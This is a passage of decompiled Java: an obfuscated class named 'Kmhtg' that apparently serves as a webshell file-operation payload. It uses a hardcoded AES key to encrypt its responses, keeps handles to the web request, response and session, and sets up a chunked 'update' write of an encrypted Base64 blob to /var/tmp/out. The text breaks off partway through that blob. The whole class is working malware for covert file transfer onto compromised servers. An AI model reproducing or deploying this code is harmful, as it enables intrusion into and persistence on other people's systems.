package com.jvn;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.charset.Charset;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* JADX INFO: compiled from: FileOperation.java */
/* JADX INFO: loaded from: 100_frame_407063.class */
public class Kmhtg {
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    public static String hash;
    public static String blockIndex;
    public static String blockSize;
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
    private Object Request;
    private Object Response;
    private Object Session;
    private Charset osCharset;

    private byte[] Encrypt(byte[] bArr) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec("1f2c8075acd3d118".getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] bArrDoFinal = cipher.doFinal(bArr);
        try {
            Class<?> cls = Class.forName("java.util.Base64");
            Object objInvoke = cls.getMethod("getEncoder", null).invoke(cls, null);
            bArrDoFinal = (byte[]) objInvoke.getClass().getMethod("encode", byte[].class).invoke(objInvoke, bArrDoFinal);
        } catch (Throwable th) {
            Object objNewInstance = Class.forName("sun.misc.BASE64Encoder").newInstance();
            bArrDoFinal = ((String) objNewInstance.getClass().getMethod("encode", byte[].class).invoke(objNewInstance, bArrDoFinal)).replace("\n", "").replace("\r", "").getBytes();
        }
        return bArrDoFinal;
    }

    public Kmhtg() {
        mode = "";
        mode += "update";
        path = "";
        path += "/var/tmp/out";
        blockIndex = "";
        blockIndex += "90";
        blockSize = "";
        blockSize += "30720";
        content = "";
        content += "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